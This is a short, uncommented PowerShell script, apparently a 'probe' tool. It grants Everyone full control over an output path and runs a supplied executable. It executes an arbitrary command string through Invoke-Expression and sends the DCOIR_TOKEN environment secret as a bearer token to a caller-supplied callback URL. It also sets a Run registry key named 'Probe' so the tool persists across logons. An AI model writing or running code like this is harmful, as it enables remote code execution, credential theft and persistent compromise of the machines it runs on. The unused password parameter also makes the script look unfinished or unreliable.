param(
    [string]$ToolPath,
    [string]$Arguments,
    [string]$OutputPath,
    [string]$Callback,
    [string]$Password,
    [string]$Command
)
$secret = ConvertTo-SecureString $Password -AsPlainText -Force
$acl = Get-Acl $OutputPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path $OutputPath -AclObject $acl
Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait
Invoke-Expression $Command
Invoke-WebRequest -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Probe -Value $ToolPath
